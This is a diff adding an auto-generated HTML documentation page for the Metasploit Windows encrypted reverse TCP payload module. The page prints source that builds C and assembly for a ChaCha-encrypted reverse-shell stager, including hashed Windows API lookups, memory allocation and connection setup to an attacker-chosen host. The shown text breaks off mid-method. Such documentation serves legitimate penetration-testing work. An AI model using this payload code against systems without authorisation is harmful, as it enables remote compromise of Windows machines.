@@ -1,0 +1,2559 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Windows::EncryptedReverseTcp
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Windows::EncryptedReverseTcp";
+  relpath = '../../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../../_index.html">Index (E)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
+     &raquo; 
+    <span class="title">EncryptedReverseTcp</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Windows::EncryptedReverseTcp
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  <dl>
+      <dt>Includes:</dt>
+      <dd><span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span>, <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span>, <span class='object_link'><a href="EncryptedPayloadOpts.html" title="Msf::Payload::Windows::EncryptedPayloadOpts (module)">EncryptedPayloadOpts</a></span>, <span class='object_link'><a href="PayloadDBConf.html" title="Msf::Payload::Windows::PayloadDBConf (module)">PayloadDBConf</a></span></dd>
+  </dl>
+  
+  
+
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/windows/encrypted_reverse_tcp.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>encrypted reverse tcp payload for Windows</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div>
+
+
+  <h2>Constant Summary</h2>
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="EncryptedPayloadOpts.html" title="Msf::Payload::Windows::EncryptedPayloadOpts (module)">EncryptedPayloadOpts</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="EncryptedPayloadOpts.html#LINK_SCRIPT_PATH-constant" title="Msf::Payload::Windows::EncryptedPayloadOpts::LINK_SCRIPT_PATH (constant)">Msf::Payload::Windows::EncryptedPayloadOpts::LINK_SCRIPT_PATH</a></span></p>
+
+  
+  
+  <h3 class="inherited">Constants included
+     from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_CONN_MAX_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_CONN_MAX_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITJ-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITP-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITP</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INITW-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITW</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_INIT_CONN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INIT_CONN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MIN_LEN</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_MODES-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_MODES</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#URI_CHECKSUM_UUID_MIN_LEN-constant" title="Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN (constant)">Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_UUID_MIN_LEN</a></span></p>
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#align_rsp-instance_method" title="#align_rsp (instance method)">#<strong>align_rsp</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#call_init_winsock-instance_method" title="#call_init_winsock (instance method)">#<strong>call_init_winsock</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#chacha_func-instance_method" title="#chacha_func (instance method)">#<strong>chacha_func</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#chacha_func_staged-instance_method" title="#chacha_func_staged (instance method)">#<strong>chacha_func_staged</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#comm_setup-instance_method" title="#comm_setup (instance method)">#<strong>comm_setup</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#exec_payload_stage-instance_method" title="#exec_payload_stage (instance method)">#<strong>exec_payload_stage</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#exit_proc-instance_method" title="#exit_proc (instance method)">#<strong>exit_proc</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#format_ds_opt-instance_method" title="#format_ds_opt (instance method)">#<strong>format_ds_opt</strong>(opt)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Options such as the LHOST and PORT need to become a null-terminated array to ensure they exist in the .text section.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate-instance_method" title="#generate (instance method)">#<strong>generate</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_c_src-instance_method" title="#generate_c_src (instance method)">#<strong>generate_c_src</strong>(conf)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_stage-instance_method" title="#generate_stage (instance method)">#<strong>generate_stage</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#generate_stager-instance_method" title="#generate_stager (instance method)">#<strong>generate_stager</strong>(conf)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_compiled_shellcode-instance_method" title="#get_compiled_shellcode (instance method)">#<strong>get_compiled_shellcode</strong>(src, opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_hash-instance_method" title="#get_hash (instance method)">#<strong>get_hash</strong>(lib, func)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_load_library-instance_method" title="#get_load_library (instance method)">#<strong>get_load_library</strong>(host, port)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>ExecutePayload acts as the main function of the c program.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#get_new_key-instance_method" title="#get_new_key (instance method)">#<strong>get_new_key</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#headers-instance_method" title="#headers (instance method)">#<strong>headers</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#include_send_uuid-instance_method" title="#include_send_uuid (instance method)">#<strong>include_send_uuid</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#init_proc-instance_method" title="#init_proc (instance method)">#<strong>init_proc</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#init_winsock-instance_method" title="#init_winsock (instance method)">#<strong>init_winsock</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initial_code-instance_method" title="#initial_code (instance method)">#<strong>initial_code</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(*args)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#sends_hex_uuid%3F-instance_method" title="#sends_hex_uuid? (instance method)">#<strong>sends_hex_uuid?</strong>  &#x21d2; Boolean </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#single_comm-instance_method" title="#single_comm (instance method)">#<strong>single_comm</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#stager_comm-instance_method" title="#stager_comm (instance method)">#<strong>stager_comm</strong>  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#start_comm-instance_method" title="#start_comm (instance method)">#<strong>start_comm</strong>(uuid)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="PayloadDBConf.html" title="Msf::Payload::Windows::PayloadDBConf (module)">PayloadDBConf</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="PayloadDBConf.html#retrieve_chacha_creds-instance_method" title="Msf::Payload::Windows::PayloadDBConf#retrieve_chacha_creds (method)">#retrieve_chacha_creds</a></span>, <span class='object_link'><a href="PayloadDBConf.html#retrieve_conf_from_db-instance_method" title="Msf::Payload::Windows::PayloadDBConf#retrieve_conf_from_db (method)">#retrieve_conf_from_db</a></span>, <span class='object_link'><a href="PayloadDBConf.html#save_conf_to_db-instance_method" title="Msf::Payload::Windows::PayloadDBConf#save_conf_to_db (method)">#save_conf_to_db</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../UUID/Options.html" title="Msf::Payload::UUID::Options (module)">UUID::Options</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../UUID/Options.html#generate_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#generate_payload_uuid (method)">#generate_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#generate_uri_uuid_mode-instance_method" title="Msf::Payload::UUID::Options#generate_uri_uuid_mode (method)">#generate_uri_uuid_mode</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid (method)">#record_payload_uuid</a></span>, <span class='object_link'><a href="../UUID/Options.html#record_payload_uuid_url-instance_method" title="Msf::Payload::UUID::Options#record_payload_uuid_url (method)">#record_payload_uuid_url</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html" title="Rex::Payloads::Meterpreter::UriChecksum (module)">Rex::Payloads::Meterpreter::UriChecksum</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_checksum-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_checksum (method)">#generate_uri_checksum</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#generate_uri_uuid-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#generate_uri_uuid (method)">#generate_uri_uuid</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#process_uri_resource-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#process_uri_resource (method)">#process_uri_resource</a></span>, <span class='object_link'><a href="../../../Rex/Payloads/Meterpreter/UriChecksum.html#uri_checksum_lookup-instance_method" title="Rex::Payloads::Meterpreter::UriChecksum#uri_checksum_lookup (method)">#uri_checksum_lookup</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="../Windows.html#apply_prepends-instance_method" title="Msf::Payload::Windows#apply_prepends (method)">#apply_prepends</a></span>, <span class='object_link'><a href="../Windows.html#exit_types-class_method" title="Msf::Payload::Windows.exit_types (method)">exit_types</a></span>, <span class='object_link'><a href="../Windows.html#handle_intermediate_stage-instance_method" title="Msf::Payload::Windows#handle_intermediate_stage (method)">#handle_intermediate_stage</a></span>, <span class='object_link'><a href="../Windows.html#replace_var-instance_method" title="Msf::Payload::Windows#replace_var (method)">#replace_var</a></span></p>
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <h3 class="inherited">Methods included from <span class='object_link'><a href="PrependMigrate.html" title="Msf::Payload::Windows::PrependMigrate (module)">PrependMigrate</a></span></h3>
+  <p class="inherited"><span class='object_link'><a href="PrependMigrate.html#apply_prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#apply_prepend_migrate (method)">#apply_prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate (method)">#prepend_migrate</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate%3F-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate? (method)">#prepend_migrate?</a></span>, <span class='object_link'><a href="PrependMigrate.html#prepend_migrate_64-instance_method" title="Msf::Payload::Windows::PrependMigrate#prepend_migrate_64 (method)">#prepend_migrate_64</a></span></p>
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="align_rsp-instance_method">
+  
+    #<strong>align_rsp</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 211</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_align_rsp'>align_rsp</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    void AlignRSP()
+    {
+      asm(&quot;push %rsi                      \\t\\n\\
+           mov %rsp, %rsi                 \\t\\n\\
+           and $0x0FFFFFFFFFFFFFFF0, %rsp \\t\\n\\
+           sub $0x020, %rsp               \\t\\n\\
+           call ExecutePayload            \\t\\n\\
+           mov %rsi, %rsp                 \\t\\n\\
+           pop %rsi                       \\t\\n\\
+           ret&quot;);
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="call_init_winsock-instance_method">
+  
+    #<strong>call_init_winsock</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+489
+490
+491
+492
+493</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 489</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_call_init_winsock'>call_init_winsock</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      init_winsock();
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="chacha_func-instance_method">
+  
+    #<strong>chacha_func</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 239</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_chacha_func'>chacha_func</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    char *chacha_data(char *buf, int len, chacha_ctx *ctx)
+      {
+        FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;,
+        char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_READWRITE);
+        chacha_encrypt_bytes(ctx, buf, out, len);
+        out[len] = &#39;\\0&#39;;
+        return out;
+      }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="chacha_func_staged-instance_method">
+  
+    #<strong>chacha_func_staged</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 227</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_chacha_func_staged'>chacha_func_staged</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    char *chacha_data(char *buf, int len, chacha_ctx *ctx)
+    {
+      chacha_encrypt_bytes(ctx, buf, buf, len);
+      buf[len] = &#39;\\0&#39;;
+
+      return buf;
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="comm_setup-instance_method">
+  
+    #<strong>comm_setup</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 287</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_comm_setup'>comm_setup</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    struct addrinfo *conn_info_setup(char *i, char *p)
+    {
+      UINT term_proc_stat = ExitProc();
+      struct addrinfo hints, *results = NULL, *first = NULL;
+      FuncGetAddrInfo GetAddrInf = (FuncGetAddrInfo) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>getaddrinfo</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;getaddrinfo&#39;) -&gt; 0x14f1f695
+      FuncFreeAddrInfo FreeAddrInf = (FuncFreeAddrInfo) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>freeaddrinfo</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;freeaddrinfo&#39;) -&gt; 0x150784f5
+      FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ExitProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;ExitProcess&#39;) -&gt; 0x56a2b5f0
+
+      SecureZeroMemory(&amp;hints, sizeof(hints));
+      hints.ai_family = AF_INET;
+      hints.ai_socktype = SOCK_STREAM;
+      hints.ai_protocol = IPPROTO_TCP;
+
+      if(GetAddrInf(i, p, &amp;hints, &amp;results))
+      {
+        ExitProcess(term_proc_stat);
+      }
+
+      first = results;
+      if(first == NULL)
+      {
+        FreeAddrInf(results);
+        ExitProcess(term_proc_stat);
+      }
+
+      return first;
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="exec_payload_stage-instance_method">
+  
+    #<strong>exec_payload_stage</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+576
+577
+578
+579
+580
+581
+582
+583
+584
+585
+586
+587
+588
+589
+590
+591
+592
+593
+594</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 576</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_exec_payload_stage'>exec_payload_stage</span>
